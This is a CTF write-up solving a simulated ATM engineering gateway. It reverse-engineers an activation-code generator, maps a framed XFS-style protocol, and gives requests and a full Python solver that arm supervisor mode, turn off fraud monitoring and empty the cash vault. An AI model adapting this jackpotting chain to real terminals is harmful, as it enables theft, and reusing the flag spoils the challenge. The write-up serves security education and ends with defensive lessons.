# TryHackMe CTF Writeup: Earth's National Bank — Terminal 004

## 1. Challenge overview

**Objective:** Investigate an exposed ATM engineering interface, understand its protocol, empty the simulated dispenser, and retrieve the flag.

**Target used during this run:** `10.49.136.225`

**Relevant services:**

| Port | Service | Role |
|---|---|---|
| 22/TCP | OpenSSH 9.6p1 | SSH service; not used in the solve |
| 8080/TCP | Python `BaseHTTPServer` | Engineering dashboard and status endpoint |
| 9100/TCP | Custom XFS bridge | Native-style terminal commands |

**Flag:**

```text
THM{n0_card_n0_pin_just_the_wr0ng_v0ice_speaking_XFS}
```

The challenge's central weakness was an exposed engineering gateway that accepted commands to control a simulated cash dispenser. A downloadable executable calculated the activation code from a visible session nonce. The gateway then accepted commands to enable supervisor mode, disable fraud monitoring, dispense notes, and retrieve the flag after the vault-empty condition was reached.

All commands below were run against the authorized CTF instance.

---

## 2. Reconnaissance

### 2.1 Full TCP port scan

The initial scan was:

```bash
nmap -sC -sV -p- -T4 10.49.136.225
```

Relevant results:

```text
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.5
8080/tcp open  http       BaseHTTPServer 0.6 (Python 3.12.3)
9100/tcp open  jetdirect?
```

The `jetdirect?` label was only Nmap's tentative identification based on the port. It did not establish the actual protocol.

A targeted scan of port 9100 provided more useful information:

```bash
nmap -Pn -sV --version-all --script=banner \
  -p 9100 --reason 10.49.136.225
```

The service banner identified the service as the **Branch Engineering Gateway**, described its protocol as an **XFS bridge**, and disclosed the request and response framing.

### 2.2 Direct banner inspection

The service could also be contacted directly:

```bash
nc -nv -w 3 10.49.136.225 9100
```

The banner was JSON preceded by a two-byte length prefix. Its key contents were:

```json
{
  "service": "Branch Engineering Gateway",
  "protocol": "XFS bridge",
  "request_format": "1 byte msg_type + 4 byte big-endian command id + 2 byte big-endian length + <length> bytes of data",
  "reply_format": "2 byte big-endian length + <length> bytes of JSON (this banner uses the same framing)",
  "msg_types": {
    "GETINFO": "0x01",
    "EXECUTE": "0x02"
  },
  "hint": "query command 0x0304 (WFS_INF_CDM_CAPABILITIES) with msg_type GETINFO for the full command table"
}
```

This was the key reconnaissance result: the service was not simply another web page. It accepted framed TCP messages for terminal information and command execution.

### 2.3 Web directory enumeration and response comparison

The initial content-discovery command was:

```bash
BASE="http://10.49.136.225:8080"
ffuf -u "$BASE/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt -ac
```

It listed several `status` variants, including `status.php`, `status.aspx`, `status.htm`, `status.html`, `status.asp`, `status-check.php`, `statuslogin.asp`, and `status.jsp`.

We compared those responses with an unrelated path to see whether the results represented distinct endpoints:

```bash
IP=10.49.136.225
BASE="http://$IP:8080"

for p in status status.php status-check.php xfs definitely-not-a-real-route-8271; do
    echo "===== /$p ====="
    curl -sS -o /tmp/atm-response \
      -w 'HTTP %{http_code} | Size: %{size_download} bytes\n' \
      "$BASE/$p"
    sha256sum /tmp/atm-response
done
```

`/status`, `/status.php`, and `/status-check.php` returned the same 399-byte response and SHA-256 hash. `/xfs` and the deliberately nonexistent route returned the same 8906-byte response and hash. This suggested generic fallback or routing behavior, rather than proving that every discovered path was a separate application endpoint.

The useful interface remained `/status` on port 8080 and the native gateway on port 9100.

---

## 3. Inspecting the dashboard and initial terminal state

The dashboard was available at:

```text
http://10.49.136.225:8080/
```

The status endpoint was:

```bash
curl -sS http://10.49.136.225:8080/status | python3 -m json.tool
```

At the start of the solve, `/status` reported:

```json
{
  "nonce": "964180",
  "armed": false,
  "monitor_on": true,
  "locked": false,
  "lock_remaining": 0,
  "screen": "INSERT CARD",
  "dispensed_total": 0,
  "remaining_notes": 280,
  "vault_total_notes": 280,
  "cassettes": [
    {"id": "CST1", "denom": 10, "count": 100},
    {"id": "CST2", "denom": 20, "count": 80},
    {"id": "CST3", "denom": 50, "count": 60},
    {"id": "CST4", "denom": 100, "count": 40}
  ],
  "flag_released": false
}
```

The inventory at that point was:

| Cassette | Denomination | Notes | Total value |
|---|---:|---:|---:|
| CST1 | 10 | 100 | 1,000 |
| CST2 | 20 | 80 | 1,600 |
| CST3 | 50 | 60 | 3,000 |
| CST4 | 100 | 40 | 4,000 |
| **Total** | | **280** | **9,600** |

These values are calculated directly from the supplied denominations and counts.

The HTML's JavaScript periodically fetched `/status` and updated the dashboard. It also provided a download link for the executable named `jackpot`. The page displayed a message when `flag_released` became true:

```javascript
if (d.flag_released) {
  f.classList.add("show");
  f.textContent = "Vault empty — cashout proven. Flag released to operator.";
}
```

This tied flag release to the cash-out objective, but the frontend did not disclose the binary gateway's request schema.

---

## 4. Reverse engineering `jackpot`

The downloaded `jackpot` file was a small, stripped, 64-bit Linux ELF executable for x86-64. Its usage string was:

```text
usage: jackpot <6-digit session code from ATM screen>
```

Static analysis recovered these values:

```text
FNV-1a offset basis: 0xcbf29ce484222325
FNV-1a prime:        0x100000001b3
Embedded string:    ENBANK
Output modulus:     100000000
```

### 4.1 Hash algorithm

The first stage applies 64-bit FNV-1a to each input byte `$b_i$`:

$$
h_0 = \mathtt{0xcbf29ce484222325}
$$

$$
h_{i+1} = ((h_i \oplus b_i) \cdot P) \bmod 2^{64}
$$

Here, `$P = \mathtt{0x100000001b3}$` is the FNV-1a prime.

The second stage mixes each byte `$c$` of the hardcoded string `ENBANK`:

$$
x = ((h \oplus c) \cdot P) \bmod 2^{64}
$$

$$
h = x \oplus (x \gg 29)
$$

The final activation code is the remainder after division by 100,000,000:

$$
\text{activation code} = h \bmod 100{,}000{,}000
$$

The program prints this remainder as an eight-digit, zero-padded decimal number.

### 4.2 Reproducing the algorithm

The following Python code reproduces the recovered logic:

```python
MASK = (1 << 64) - 1
FNV_OFFSET = 0xCBF29CE484222325
FNV_PRIME = 0x100000001B3
SECRET = b"ENBANK"
MODULUS = 100_000_000


def activation_code(session: str) -> str:
    data = session.encode("ascii")
    if len(data) != 6:
        raise ValueError("Input must be exactly 6 ASCII bytes")

    h = FNV_OFFSET
    for byte in data:
        h = ((h ^ byte) * FNV_PRIME) & MASK

    for byte in SECRET:
        x = ((h ^ byte) * FNV_PRIME) & MASK
        h = x ^ (x >> 29)

    return f"{h % MODULUS:08d}"
```

When the challenge-provided executable was run with the live nonce `964180`, it returned the following output. The binary itself is a challenge artifact, not a helper script required by this writeup; the recovered algorithm is reproduced in Python above and is also implemented in the complete solver in Section 15.

```text
./jackpot 964180
[*] session nonce : 964180
[*] activation code: 55524415
```

The code was derived rather than guessed. Because the nonce was displayed by the status page and the algorithm and constant were recoverable from the client executable, the mechanism did not provide secrecy against someone who could inspect the challenge assets.

---

## 5. Understanding the binary protocol

### 5.1 Request and response framing

The banner described this request format:

| Field | Size | Description |
|---|---:|---|
| Message type | 1 byte | `0x01` = GETINFO; `0x02` = EXECUTE |
| Command ID | 4 bytes | Big-endian command identifier |
| Payload length | 2 bytes | Big-endian number of payload bytes |
| Payload | Variable | Command-specific data |

A Python request header can be produced with:

```python
struct.pack(">BIH", message_type, command_id, len(payload)) + payload
```

The `>` prefix means big-endian, `B` is one unsigned byte, `I` is a four-byte unsigned integer, and `H` is a two-byte unsigned integer.

Responses use a two-byte big-endian length followed by a JSON response body. A robust TCP reader must read the indicated number of bytes because a single `recv()` is not guaranteed to return a complete frame.

```python
def recv_exact(sock, size):
    data = bytearray()
    while len(data) < size:
        chunk = sock.recv(size - len(data))
        if not chunk:
            raise ConnectionError("Connection closed before frame completed")
        data.extend(chunk)
    return bytes(data)


def recv_frame(sock):
    length = struct.unpack(">H", recv_exact(sock, 2))[0]
    return recv_exact(sock, length)
```

### 5.2 Capabilities query

The banner explicitly suggested querying command `0x0304` using GETINFO. The seven-byte request was:

```text
01 00 00 03 04 00 00
```

Breaking it down:

```text
01          GETINFO
00 00 03 04 Command ID 0x0304
00 00       Empty payload
```

The capabilities response disclosed the command table:

| Command ID | Name | Purpose inferred from its name/response |
|---|---|---|
| `0x0301` | `WFS_INF_CDM_STATUS` | Read terminal status |
| `0x0303` | `WFS_INF_CDM_CASH_UNIT_INFO` | Read cassette information |
| `0x0304` | `WFS_INF_CDM_CAPABILITIES` | Read capabilities and command table |
| `0x0401` | `WFS_CMD_CDM_DISPENSE` | Dispense command |
| `0x04F0` | `WFS_CMD_CDM_ARM` | Custom supervisor activation |
| `0x04F1` | `WFS_CMD_CDM_SET_MONITOR` | Custom monitor control |
| `0x04FF` | `WFS_CMD_CDM_GET_FLAG` | Custom flag retrieval |

The response also advertised `max_dispense: 40`.

---

## 6. Read-only protocol queries

For the manual investigation, a small diagnostic Python client opened a connection, read the banner, and queried status, cassette information, capabilities, and the custom command IDs. The protocol helpers and request format are shown in this section; the consolidated runnable solver is reproduced in full in Section 15.

A basic GETINFO request function looked like this:

```python
def query(sock, command_id):
    request = struct.pack(">BIH", 0x01, command_id, 0)
    sock.sendall(request)
    return recv_frame(sock)
```

The important read-only command results were:

- `0x0301` returned the same nonce and terminal state seen on the web page.
- `0x0303` returned the four cassette counts and `remaining_notes: 280`.
- `0x0304` returned the supported command table and maximum dispense value.

The custom command IDs were also queried using GETINFO. Their responses included:

```json
{"rc":"WFS_ERR_CDM_INVALIDCODE","detail":"invalid activation code"}
```

for `0x04F0`,

```json
{"rc":"WFS_ERR_CDM_NOTARMED"}
```

for `0x04F1`, and

```json
{"rc":"WFS_ERR_CDM_CASHUNITERROR","detail":"no proof of cashout on record"}
```

for `0x04FF`.

These responses exposed useful validation information, but they were GETINFO probes rather than successful executions of those commands.

---

## 7. Enabling supervisor mode

Once the activation code had been calculated, an EXECUTE (`0x02`) request sent it to ARM (`0x04F0`).

The key code was:

```python
ACTIVATION_CODE = "55524415"
payload = ACTIVATION_CODE.encode("ascii")
request = struct.pack(">BIH", 0x02, 0x04F0, len(payload)) + payload
```

The exact request bytes were:

```text
02 00 00 04 f0 00 08 35 35 35 32 34 34 31 35
```

The gateway returned:

```json
{
  "rc": "WFS_SUCCESS",
  "detail": "armed - supervisor mode"
}
```

The `/status` endpoint confirmed `armed: true` and changed the screen text to `SUPERVISOR MODE`.

The important distinction was between message types: the banner had described both GETINFO (`0x01`) and EXECUTE (`0x02`), and ARM required an EXECUTE request carrying the code as ASCII payload.

---

## 8. Disabling fraud monitoring

The monitor-control command was `0x04F1`. Using EXECUTE with the ASCII payload `OFF` succeeded:

```python
payload = b"OFF"
request = struct.pack(">BIH", 0x02, 0x04F1, len(payload)) + payload
```

The request bytes were:

```text
02 00 00 04 f1 00 03 4f 46 46
```

The response was:

```json
{
  "rc": "WFS_SUCCESS",
  "monitor_on": false
}
```

We verified the change with:

```bash
curl -sS http://10.49.136.225:8080/status | python3 -m json.tool
```

The response showed:

```json
{
  "armed": true,
  "monitor_on": false,
  "locked": false,
  "dispensed_total": 0,
  "remaining_notes": 280
}
```

This confirmed that supervisor mode was active, the monitor was disabled, and no notes had yet been dispensed.

---

## 9. The dispense command and unexpected behavior

The capabilities response identified `0x0401` as `WFS_CMD_CDM_DISPENSE`. The XFS reference describes a dispense request in terms of fields such as teller ID, mix number, output position, presentation choice, and a denomination structure. The denomination structure can include the currency, amount, number of cash units, and a value/count array associated with each cash unit. The reference does not specify the JSON serialization of this challenge's custom bridge.

The first test used this JSON payload, intended to request one $10 note from the first cassette:

```json
{
  "teller_id": 0,
  "mix_number": 0,
  "position": 0,
  "present": true,
  "denomination": {
    "currency": "USD",
    "amount": 10,
    "count": 4,
    "values": [1, 0, 0, 0],
    "cash_box": 0
  }
}
```

It was encoded and sent with:

```python
payload = json.dumps(payload_obj).encode("utf-8")
request = struct.pack(">BIH", 0x02, 0x0401, len(payload)) + payload
```

The gateway returned:

```json
{
  "rc": "WFS_SUCCESS",
  "notes": 40,
  "value": 4000,
  "remaining_notes": 240
}
```

The status endpoint then showed `dispensed_total: 40`, `remaining_notes: 240`, and `CST4` reduced from 40 notes to zero. The value of that cassette was 40 notes × 100 = 4,000, matching the command response.

This was an unexpected result: the request was intended to select the first cash unit, yet the observed status showed that the $100 cassette had been emptied. We did not have the gateway's implementation source code, so we could not prove whether the wrapper ignored fields, applied a default operation, or interpreted the payload differently. It would be incorrect to claim that standard XFS itself explains this behavior.

The same dispense request was issued multiple times. A later successful response reported:

```json
{
  "rc": "WFS_SUCCESS",
  "notes": 40,
  "value": 400,
  "remaining_notes": 0,
  "detail": "vault empty - cashout proven; GET_FLAG now available"
}
```

The exact internal note-selection behavior remained unexplained, but the gateway's response and fresh status established that the objective condition was reached: zero notes remained and GET_FLAG was now available.

**Operational note:** Once the vault-empty state is reached, do not keep sending dispense requests. Verify the state and move to flag retrieval.

---

## 10. Retrieving the flag manually

The flag command was `0x04FF`. Its earlier GETINFO response had indicated that no cash-out proof existed. After the dispenser reported zero notes remaining, we sent an EXECUTE request with no payload:

```python
request = struct.pack(">BIH", 0x02, 0x04FF, 0)
```

The request bytes were:

```text
02 00 00 04 ff 00 00
```

The gateway returned:

```json
{
  "rc": "WFS_SUCCESS",
  "flag": "THM{n0_card_n0_pin_just_the_wr0ng_v0ice_speaking_XFS}"
}
```

This was the final confirmation that the challenge objective had been completed.

---

## 11. Single-click / single-script automated solver

After the manual investigation identified the protocol, activation algorithm, monitor payload, and observed-working dispense payload, the separate steps were combined into one script: `atm_ctf_solve.py`.

The full solver source is included at the end of this document in Section 15; no separate source file is needed to read or reproduce it.

The script uses Python's standard library only. It does not rely on the original `jackpot` executable because its hash algorithm has been reproduced in Python.

### 11.1 Run it against a fresh target

After restarting the target, use the current IP shown by TryHackMe. The target address and nonce are not reused from the earlier run.

Pass the new IP as an argument:

```bash
python3 atm_ctf_solve.py <NEW_TARGET_IP>
```

Or start it without an argument and enter the address when prompted:

```bash
python3 atm_ctf_solve.py
```

The script then requires an explicit confirmation matching the target address, for example:

```text
Type RUN <NEW_TARGET_IP> to continue:
```

This is the one-run “single-click solver” for the challenge: after entering the current target IP and confirming it, the script performs the remaining workflow automatically. It is not fully unattended because it intentionally asks for confirmation before changing terminal state and issuing dispense commands.

### 11.2 What the solver does

The script performs this sequence:

1. **Connects to the supplied target** on TCP port 9100 and validates the gateway banner.
2. **Queries live status** via command `0x0301` and extracts the current nonce and note count.
3. **Derives the activation code** using the recovered FNV-1a and `ENBANK` algorithm.
4. **Arms supervisor mode** using command `0x04F0`, unless the status already says the terminal is armed.
5. **Disables the monitor** using command `0x04F1` with the observed accepted payload `OFF`, unless the monitor is already disabled.
6. **Queries capabilities** to retrieve the advertised per-request dispense limit.
7. **Submits the previously observed dispense payload**, checking `/status` through the native status command after every request.
8. **Stops on errors or unexpected behavior**, including no reduction in remaining notes, lockout, loss of supervisor mode, or a safety attempt cap.
9. **Verifies the vault-empty condition**, then executes `0x04FF` to retrieve the flag.

The script includes a confirmation prompt, bounds the number of dispense attempts, checks response codes, and reads current state between operations rather than assuming each dispense request had the expected effect.

### 11.3 Important limitations

The payload used for `0x0401` is challenge-specific. It is not a portable XFS protocol implementation, and the exact reason that the gateway dispensed 40 notes from an unexpected cassette was not established. The automated script uses the payload observed to work in this specific challenge and checks the result after each operation.

The script has been syntax-checked and the activation calculation was checked against the known result `964180` → `55524415`; it was not independently executed end-to-end against a freshly restarted instance in this writeup. If the challenge author changes the gateway's payload parsing, note limits, or command behavior, the automation may stop with an error and need to be re-investigated.

Use it only against the authorized, simulated CTF instance. It deliberately changes terminal state, disables monitoring, and performs dispensing operations.

---

## 12. Attack-chain summary

| Stage | Evidence / action | Result |
|---|---|---|
| Reconnaissance | Nmap and banner inspection | Found HTTP dashboard on 8080 and XFS bridge on 9100 |
| Status review | `GET /status` | Read nonce `964180`, note inventory, and initial state |
| Reverse engineering | Static analysis of `jackpot` | Recovered FNV-1a plus `ENBANK` mixing algorithm |
| Code calculation | `./jackpot 964180` | Activation code `55524415` |
| Protocol enumeration | GETINFO `0x0304` | Retrieved the command table and `max_dispense: 40` |
| Supervisor activation | EXECUTE `0x04F0` | `WFS_SUCCESS`; supervisor mode enabled |
| Monitor control | EXECUTE `0x04F1`, payload `OFF` | `WFS_SUCCESS`; monitoring disabled |
| Dispenser operation | EXECUTE `0x0401` with challenge-specific JSON | Repeated operations eventually reached zero remaining notes |
| Flag retrieval | EXECUTE `0x04FF`, empty payload | Received the flag |

---

## 13. Root cause and defensive lessons

### Exposed management interface

The gateway accepted direct network connections and exposed privileged device operations. Engineering interfaces should be isolated from untrusted networks and reachable only from tightly controlled maintenance hosts.

### Recoverable activation code

The nonce was visible through the status page, while the activation algorithm and its constant string were recoverable from the downloadable binary. A deterministic client-side calculation should not be the sole protection for privileged commands.

### Weak command-level authorization

The accepted flow allowed supervisor mode and the monitoring state to be changed through the exposed service. Privileged operations should require robust authentication and authorization at the gateway itself, independently for each operation.

### Ambiguous dispense argument handling

The dispense response did not match the apparent intention of the submitted denomination fields. Strict schema validation, explicit handling of unknown fields, and clear rejection of invalid or incomplete requests would make this class of error less likely.

### Monitoring must not be the authorization boundary

Disabling fraud monitoring should not itself allow transactions that lack valid authorization. Monitoring, policy enforcement, and command authorization should be separate controls.

### Auditing and safety limits

Supervisor-mode changes, monitoring changes, and dispenser operations should be logged. Note-count limits and cassette-selection validation should be enforced server-side, not trusted to caller-supplied JSON.

These lessons follow from the observed challenge behavior; they do not imply that every real ATM or XFS service implements the same custom gateway.

---

## 14. Final flag

```text
THM{n0_card_n0_pin_just_the_wr0ng_v0ice_speaking_XFS}
```

**Conclusion:** The challenge was solved by combining binary reverse engineering with network reconnaissance and protocol-level interaction. The decisive steps were recovering the activation-code algorithm, identifying the custom gateway's framing and command table, enabling supervisor mode, changing the monitor state, reaching the vault-empty condition, and invoking the flag command.

---

## 15. Complete single-script solver (full source)

The following is the complete source for `atm_ctf_solve.py`, included here so the writeup is self-contained. Save the code block as `atm_ctf_solve.py` and run it with the current target IP shown by the CTF platform. It prompts for confirmation before making state-changing requests.

```python
#!/usr/bin/env python3
"""Single-run solver for the simulated Earth's National Bank CTF gateway.

Uses only Python's standard library. The script derives the activation code
from the live nonce, arms supervisor mode, disables the monitor, submits the
previously observed successful dispense payload while checking state after
each request, then requests the flag once the vault reports zero notes.

This is specific to the custom challenge gateway; it is not a generic XFS client.
"""

import argparse
import json
import math
import socket
import struct
import sys

# Set from the current TryHackMe target IP at runtime.
HOST = ""
PORT = 9100
TIMEOUT = 5
MAX_FRAME_SIZE = 16_384

GETINFO = 0x01
EXECUTE = 0x02
CMD_STATUS = 0x0301
CMD_CAPABILITIES = 0x0304
CMD_DISPENSE = 0x0401
CMD_ARM = 0x04F0
CMD_SET_MONITOR = 0x04F1
CMD_GET_FLAG = 0x04FF

FNV_OFFSET = 0xCBF29CE484222325
FNV_PRIME = 0x100000001B3
MASK64 = (1 << 64) - 1
SECRET = b"ENBANK"


def recv_exact(sock: socket.socket, size: int) -> bytes:
    """Read exactly size bytes, or raise if the peer closes early."""
    chunks = bytearray()
    while len(chunks) < size:
        part = sock.recv(size - len(chunks))
        if not part:
            raise ConnectionError(f"Connection closed at {len(chunks)}/{size} bytes")
        chunks.extend(part)
    return bytes(chunks)


def recv_frame(sock: socket.socket) -> bytes:
    """Read the gateway's two-byte big-endian length-prefixed frame."""
    size = struct.unpack(">H", recv_exact(sock, 2))[0]
    if size > MAX_FRAME_SIZE:
        raise ValueError(f"Refusing unexpected response frame size: {size}")
    return recv_exact(sock, size)


def parse_json(raw: bytes, label: str) -> dict:
    try:
        value = json.loads(raw.decode("utf-8"))
    except (UnicodeDecodeError, json.JSONDecodeError) as exc:
        preview = raw[:200].decode("utf-8", errors="replace")
        raise ValueError(f"{label} was not valid JSON: {preview!r}") from exc
    if not isinstance(value, dict):
        raise ValueError(f"{label} was not a JSON object")
    return value


def gateway_command(message_type: int, command_id: int, payload: bytes = b"") -> dict:
    """Open a connection, consume the service banner, send one request, read reply."""
    if len(payload) > 0xFFFF:
        raise ValueError("Payload is too large for the protocol length field")

    with socket.create_connection((HOST, PORT), timeout=TIMEOUT) as sock:
        sock.settimeout(TIMEOUT)
        banner = parse_json(recv_frame(sock), "gateway banner")

        if banner.get("service") != "Branch Engineering Gateway":
            raise RuntimeError(
                f"Unexpected service at {HOST}:{PORT}: {banner.get('service')!r}"
            )

        packet = struct.pack(">BIH", message_type, command_id, len(payload)) + payload
        sock.sendall(packet)
        return parse_json(recv_frame(sock), f"response for command 0x{command_id:04X}")


def activation_code(session: str) -> str:
    """Reproduce jackpot's 64-bit FNV-1a + ENBANK mixing algorithm."""
    data = session.encode("ascii")
    if len(data) != 6:
        raise ValueError(f"Expected a six-byte session nonce, got {session!r}")

    h = FNV_OFFSET
    for byte in data:
        h = ((h ^ byte) * FNV_PRIME) & MASK64

    for byte in SECRET:
        x = ((h ^ byte) * FNV_PRIME) & MASK64
        h = x ^ (x >> 29)

    return f"{h % 100_000_000:08d}"


def get_status() -> dict:
    result = gateway_command(GETINFO, CMD_STATUS)
    if result.get("rc") != "WFS_SUCCESS" or not isinstance(result.get("status"), dict):
        raise RuntimeError(f"Status query failed: {json.dumps(result)}")
    return result["status"]


def require_success(result: dict, operation: str) -> dict:
    if result.get("rc") != "WFS_SUCCESS":
        raise RuntimeError(f"{operation} failed: {json.dumps(result)}")
    return result


def main() -> int:
    global HOST, PORT

    parser = argparse.ArgumentParser(
        description="Run the single-target solver against an authorized ATM CTF instance."
    )
    parser.add_argument(
        "host",
        nargs="?",
        help="Current target IP/address shown by the CTF platform; prompted if omitted.",
    )
    parser.add_argument(
        "--port",
        type=int,
        default=9100,
        help="Gateway TCP port (default: 9100).",
    )
    args = parser.parse_args()

    HOST = (args.host or input("Enter the current target IP/address shown by the CTF platform: ")).strip()
    PORT = args.port
    if not HOST:
        print("[-] No target supplied; exiting without sending commands.", file=sys.stderr)
        return 2
    if not 1 <= PORT <= 65535:
        print("[-] Port must be between 1 and 65535.", file=sys.stderr)
        return 2

    print(f"[*] Target: {HOST}:{PORT}")
    print("[!] This will change the simulated ATM state and request dispensing.")
    confirm = input(f'Type RUN {HOST} to continue: ').strip()
    if confirm != f"RUN {HOST}":
        print("[-] Confirmation did not match; no commands sent.")
        return 1

    try:
        status = get_status()
        nonce = str(status.get("nonce", ""))
        code = activation_code(nonce)
        print(f"[*] Live nonce: {nonce}")
        print(f"[*] Derived activation code: {code}")
        print(
            f"[*] Initial state: armed={status.get('armed')}, "
            f"monitor_on={status.get('monitor_on')}, locked={status.get('locked')}, "
            f"remaining_notes={status.get('remaining_notes')}"
        )

        if status.get("locked"):
            raise RuntimeError(
                f"Terminal is locked (lock_remaining={status.get('lock_remaining')}); stopping."
            )

        # Enable supervisor mode only when needed.
        if not status.get("armed"):
            print("[*] Enabling supervisor mode...")
            arm_result = gateway_command(EXECUTE, CMD_ARM, code.encode("ascii"))
            print("    ARM:", json.dumps(arm_result))
            require_success(arm_result, "ARM")
            status = get_status()
            if not status.get("armed"):
                raise RuntimeError("ARM returned success, but status does not show armed=true")
        else:
            print("[*] Supervisor mode is already armed; skipping ARM.")

        # Disable monitoring only if it is currently enabled.
        if status.get("monitor_on"):
            print("[*] Disabling fraud monitor...")
            monitor_result = gateway_command(EXECUTE, CMD_SET_MONITOR, b"OFF")
            print("    SET_MONITOR:", json.dumps(monitor_result))
            require_success(monitor_result, "SET_MONITOR OFF")
            status = get_status()
            if status.get("monitor_on"):
                raise RuntimeError("Monitor command returned success, but monitor_on is still true")
        else:
            print("[*] Fraud monitor is already off; skipping monitor command.")

        caps_result = gateway_command(GETINFO, CMD_CAPABILITIES)
        require_success(caps_result, "Capabilities query")
        max_dispense = int(caps_result.get("max_dispense", 40))
        if max_dispense <= 0:
            max_dispense = 40
        print(f"[*] Gateway max_dispense: {max_dispense} notes/request (as advertised)")

        initial_remaining = int(status.get("remaining_notes", -1))
        if initial_remaining < 0:
            raise RuntimeError("Status did not provide a valid remaining_notes value")

        # This is the same challenge-specific JSON payload that returned WFS_SUCCESS
        # in the user's test. It is NOT a portable/standard XFS wire structure.
        dispense_payload = json.dumps(
            {
                "teller_id": 0,
                "mix_number": 0,
                "position": 0,
                "present": True,
                "denomination": {
                    "currency": "USD",
                    "amount": 10,
                    "count": 4,
                    "values": [1, 0, 0, 0],
                    "cash_box": 0,
                },
            },
            separators=(",", ":"),
        ).encode("utf-8")

        # A successful request was observed to dispense 40 notes. The loop checks
        # fresh status after every operation and stops if no progress or an error occurs.
        max_attempts = min(30, max(10, math.ceil(initial_remaining / max_dispense) * 3))
        attempts = 0

        while True:
            status = get_status()
            remaining_before = int(status.get("remaining_notes", -1))
            if remaining_before < 0:
                raise RuntimeError("Invalid remaining_notes in status response")
            if remaining_before == 0:
                print("[*] Vault is empty according to live status.")
                break
            if status.get("locked"):
                raise RuntimeError("Terminal became locked; stopping dispense loop.")
            if not status.get("armed"):
                raise RuntimeError("Supervisor mode is no longer armed; stopping.")
            if attempts >= max_attempts:
                raise RuntimeError(
                    f"Reached safety cap of {max_attempts} dispense requests with "
                    f"{remaining_before} notes still remaining."
                )

            attempts += 1
            print(f"[*] Dispense request {attempts}/{max_attempts}; notes before={remaining_before}")
            dispense_result = gateway_command(EXECUTE, CMD_DISPENSE, dispense_payload)
            print("    DISPENSE:", json.dumps(dispense_result))
            require_success(dispense_result, "DISPENSE")

            reported_notes = dispense_result.get("notes")
            if isinstance(reported_notes, (int, float)) and reported_notes > max_dispense:
                raise RuntimeError(
                    f"Gateway reported {reported_notes} notes, above advertised limit "
                    f"{max_dispense}; stopping for review."
                )

            status_after = get_status()
            remaining_after = int(status_after.get("remaining_notes", -1))
            print(
                f"    State after request: dispensed_total={status_after.get('dispensed_total')}, "
                f"remaining_notes={remaining_after}, locked={status_after.get('locked')}"
            )
            if remaining_after < 0:
                raise RuntimeError("Invalid remaining_notes after dispense")
            if remaining_after >= remaining_before and remaining_after != 0:
                raise RuntimeError("Dispense reported success but remaining note count did not decrease")

        # Recheck state before requesting the flag.
        final_status = get_status()
        if int(final_status.get("remaining_notes", -1)) != 0:
            raise RuntimeError("Status did not confirm an empty vault; refusing GET_FLAG")

        print("[*] Requesting flag...")
        flag_result = gateway_command(EXECUTE, CMD_GET_FLAG)
        print(json.dumps(flag_result, indent=2))
        require_success(flag_result, "GET_FLAG")

        flag = flag_result.get("flag")
        if flag:
            print(f"\n[+] FLAG: {flag}")
        else:
            print("[!] GET_FLAG succeeded but response contained no 'flag' field.")
            return 2

        return 0

    except (OSError, ConnectionError, TimeoutError, ValueError, RuntimeError, KeyError) as exc:
        print(f"\n[!] Stopped: {exc}", file=sys.stderr)
        print("[!] Inspect the live /status state before retrying.", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
```
